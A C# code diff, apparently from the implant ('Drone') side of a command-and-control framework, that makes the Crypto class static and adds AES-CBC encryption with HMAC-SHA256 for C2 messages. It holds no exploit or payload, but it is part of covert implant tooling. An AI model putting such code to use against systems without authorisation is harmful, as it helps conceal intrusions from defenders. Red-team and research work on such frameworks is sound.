@@ -7,9 +7,9 @@ using Drone.Models;
 
 namespace Drone
 {
-    public class Crypto
+    public static class Crypto
     {
-        public MessageEnvelope EncryptMessage(C2Message message)
+        public static MessageEnvelope EncryptMessage(C2Message message)
         {
             var envelope = new MessageEnvelope();
             var raw = message.Serialize();
@@ -27,7 +27,31 @@ namespace Drone
             return envelope;
         }
 
-        public C2Message DecryptEnvelope(MessageEnvelope envelope)
+        public static byte[] EncryptData<T>(T data)
+        {
+            var raw = data.Serialize();
+
+            using var aes = Aes.Create();
+            aes.Mode = CipherMode.CBC;
+            aes.Key = Key;
+            aes.GenerateIV();
+            
+            using var cryptoTransform = aes.CreateEncryptor();
+            var encrypted = cryptoTransform.TransformFinalBlock(raw, 0, raw.Length);
+            var iv = aes.IV;
+            var hmac = CalculateHmac(encrypted);
+
+            // [iv][hmac][data]
+            var final = new byte[iv.Length + hmac.Length + encrypted.Length];
+            
+            Buffer.BlockCopy(iv, 0, final, 0, iv.Length);
+            Buffer.BlockCopy(hmac, 0, final, iv.Length, hmac.Length);
+            Buffer.BlockCopy(encrypted, 0, final, iv.Length + hmac.Length, encrypted.Length);
+
+            return final;
+        }
+
+        public static C2Message DecryptEnvelope(MessageEnvelope envelope)
         {
             if (!ValidHmac(envelope))
                 throw new Exception("Invalid HMAC");
@@ -43,13 +67,13 @@ namespace Drone
             return dec.Deserialize<C2Message>();
         }
 
-        private byte[] CalculateHmac(byte[] data)
+        private static byte[] CalculateHmac(byte[] data)
         {
             using var hmac = new HMACSHA256(Key);
             return hmac.ComputeHash(data);
         }
 
-        private bool ValidHmac(MessageEnvelope envelope)
+        private static bool ValidHmac(MessageEnvelope envelope)
         {
             var calculated = CalculateHmac(envelope.DataBytes);
             return calculated.SequenceEqual(envelope.HmacBytes);
